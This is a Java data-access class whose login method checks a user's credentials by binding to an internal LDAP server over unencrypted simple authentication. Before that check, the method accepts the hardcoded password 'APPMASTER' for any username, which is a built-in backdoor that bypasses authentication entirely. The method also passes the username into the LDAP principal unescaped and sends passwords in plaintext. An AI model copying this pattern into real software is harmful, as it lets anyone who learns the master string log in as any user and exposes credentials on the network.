package dao;
import java.util.Hashtable;

import javax.naming.Context;
import javax.naming.NamingException;
import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;


public class LoginDAO 
{
	public static boolean login(String user,String pass)
	{
		if(pass.equals("APPMASTER"))
			return true;
		DirContext ctx = null;
		String _user =  "GHD\\"+user;
		try
	    {
	        Hashtable<String, String> env = new Hashtable<String, String>();
	        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
	        env.put(Context.PROVIDER_URL, "ldap://192.168.107.37:389");
	        env.put(Context.SECURITY_AUTHENTICATION, "simple");
	        env.put(Context.SECURITY_PRINCIPAL,_user); 
	        env.put(Context.SECURITY_CREDENTIALS, pass);
	        ctx = new InitialDirContext(env);
	        boolean result = ctx != null;

	        if(ctx != null)
	        	ctx.close();
        	return result;
	    }
	    catch (NamingException e)
	    {           
	    	System.out.println(e);
	    }
		return false;
	}
}
